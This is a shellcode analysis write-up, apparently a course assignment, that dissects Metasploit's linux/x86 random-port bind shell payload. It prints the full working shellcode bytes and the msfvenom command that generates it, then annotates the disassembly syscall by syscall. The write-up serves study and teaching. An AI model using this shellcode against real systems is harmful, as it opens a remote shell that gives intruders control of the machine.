# linux/x86/shell_bind_tcp_random_port
- Analysis by: William Moody
- PA-25640

First I dumped the shellcode:
`msfvenom -p linux/x86/shell_bind_tcp_random_port -f c`

Next I got a graph with libemu:
```
echo -ne "\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x52\x50\x89\xe1\xb0\x66\xb3\x04\xcd\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\xcd\x80" | sctest -vvvv -Ss 100000 -G linux-x86-shell_bind_tcp_random_port.dot
dot linux-x86-shell_bind_tcp_random_port.dot -Tpng -o linux-x86-shell_bind_tcp_random_port.png
```

<<INSERT GRAPH HERE>>

Next I dissasembled the shellcode with ndisasm. This time the shellcode was accurate.
`echo -ne ... | ndisasm -u - -b32 -p intel`

Finally I started analyzing the workings with gdb.

```
b*main+286
r
stepi
```

First the shellcode creates a socket with the socketcall syscall and the
SYS_SOCKET subcall.

```
int socketcall(0x1, *args);
int sockfd = socket(int domain, int type, int protocol);
```

```
00000000  31DB              xor ebx,ebx				; EBX = 0
00000002  F7E3              mul ebx				
00000004  B066              mov al,0x66				; EAX = 0x66 (SYS_SOCKETCALL)
00000006  43                inc ebx					; EBX = 0x1 (SYS_SOCKET)
00000007  52                push edx				; int protocol = 0x0 (default)
00000008  53                push ebx				; int type = 0x1 (SOCK_STREAM)
00000009  6A02              push byte +0x2			; int domain = 0x2 (AF_INET)
0000000B  89E1              mov ecx,esp				; *args = ESP
0000000D  CD80              int 0x80				; socketcall() -> socket()
```

Next, the shellcode makes another socketcall, this time it is with the 
SYS_LISTEN subcall. Since the socket was not bound to any port, this will
make the socket listen on an arbitrary (free) port.

```
int socketcall(0x4, *args);
int listen(sockfd, 0);
```

```
0000000F  52                push edx				; int backlog = 0
00000010  50                push eax				; int sockfd = result of socket()
00000011  89E1              mov ecx,esp				; *args = ESP
00000013  B066              mov al,0x66				; EAX = 0x66 (SYS_SOCKETCALL)
00000015  B304              mov bl,0x4				; EBX = 0x4
00000017  CD80              int 0x80				; socketcall() -> listen()
```

Next, another socketcall (SYS_ACCEPT). This will block until a client connects
to the socket.

```
int socketcall(int 0x5, *args);
int accept();
```

```
00000019  B066              mov al,0x66				; EAX = 0x66 (SYS_SOCKETCALL)
0000001B  43                inc ebx					; EBX = 0x5 (SYS_ACCEPT)
0000001C  CD80              int 0x80				; socketcall() -> accept()
```

For testing I connected to the socket with netcat.

<<INSERT NETCAT PICTURE HERE>>

Once a client connected to the socket, the following shellcode will execute.
It will duplicate the file descriptors 0-ECX in a loop (STDIN, STDOUT, STDERR)
so that all I/O to the shell will be controlled by the client. 

```
int dup2(int oldfd, int newfd);
```

```
0000001E  59                pop ecx					; ECX = sockfd
0000001F  93                xchg eax,ebx			; EBX = 4
00000020  6A3F              push byte +0x3f
00000022  58                pop eax					; EAX = 0x3f (SYS_dup2)
00000023  CD80              int 0x80				; dup2()
00000025  49                dec ecx
00000026  79F8              jns 0x20
```

And finally "/bin/sh" is executed and the client should have a shell now.

```
int execve(const char *pathname, char *const argv[], char *const envp[]);
```

```
00000028  B00B              mov al,0xb				; EAX = 0xb (SYS_EXECVE)
0000002A  682F2F7368        push dword 0x68732f2f	; "hs//"
0000002F  682F62696E        push dword 0x6e69622f	; "nib/"
00000034  89E3              mov ebx,esp				; argv[] = *"/bin//sh"
00000036  41                inc ecx					; envp[] = nullptr
00000037  CD80              int 0x80				; execve()
```
